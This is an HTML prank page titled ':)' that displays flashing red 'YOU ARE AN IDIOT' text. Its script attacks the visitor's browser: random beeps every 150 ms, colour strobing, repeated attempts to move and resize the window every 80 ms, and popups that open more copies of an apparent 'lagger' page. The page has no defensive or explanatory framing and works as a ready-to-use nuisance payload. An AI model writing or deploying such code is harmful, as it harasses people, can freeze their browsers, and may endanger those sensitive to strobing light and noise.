<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>:)</title>
<style>
*{margin:0;padding:0}
body{background:#000;overflow:hidden;cursor:none}
.w{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column}
h1{font-family:'Zilla Slab Highlight',serif;font-size:10vw;color:#ff1a1a;animation:s .08s infinite alternate}
h2{font-family:'Zilla Slab Highlight',serif;font-size:4vw;color:#ff4444;margin-top:20px;animation:s .12s infinite alternate}
@keyframes s{0%{transform:scale(1) rotate(0deg)}50%{transform:scale(1.05) rotate(-1deg)}100%{transform:scale(.95) rotate(1deg)}}
.b{position:fixed;border-radius:50%;pointer-events:none;animation:f linear infinite}
@keyframes f{0%{transform:translateY(0) rotate(0deg);opacity:1}100%{transform:translateY(-100vh) rotate(720deg);opacity:0}}
</style>
<link href="https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap" rel="stylesheet">
</head>
<body>
<div class="w">
<h1>YOU ARE AN IDIOT</h1>
<h2>HA HA HA HA HA</h2>
</div>
<script>
(function(){
try{var ac=new(window.AudioContext||window.webkitAudioContext)();function beep(){var o=ac.createOscillator();var g=ac.createGain();o.connect(g);g.connect(ac.destination);o.frequency.value=200+Math.random()*2000;g.gain.value=0.08;o.start();o.stop(ac.currentTime+0.1);}
setInterval(beep,150);}catch(e){}

function spawn(){for(var i=0;i<10;i++){var d=document.createElement('div');d.className='b';var sz=10+Math.random()*40;d.style.cssText='width:'+sz+'px;height:'+sz+'px;background:hsl('+Math.random()*60+',100%,50%);left:'+Math.random()*100+'vw;bottom:-50px;animation-duration:'+(1+Math.random()*2)+'s;';document.body.appendChild(d);setTimeout(function(el){el.remove();},3000,d);}
}
setInterval(spawn,200);

setInterval(function(){document.body.style.background='hsl('+Math.random()*360+',100%,5%)';},200);

setInterval(function(){try{window.resizeTo(Math.random()*screen.width,Math.random()*screen.height);window.moveTo(Math.random()*screen.width,Math.random()*screen.height);}catch(e){}},80);

try{
var w2=window.open('/tools/lagger/index.html','_blank','width=400,height=300');
setTimeout(function(){try{window.open('/tools/lagger/index.html','_blank','width=400,height=300');}catch(e){}},1000);
}catch(e){}
})();
</script>
</body>
</html>
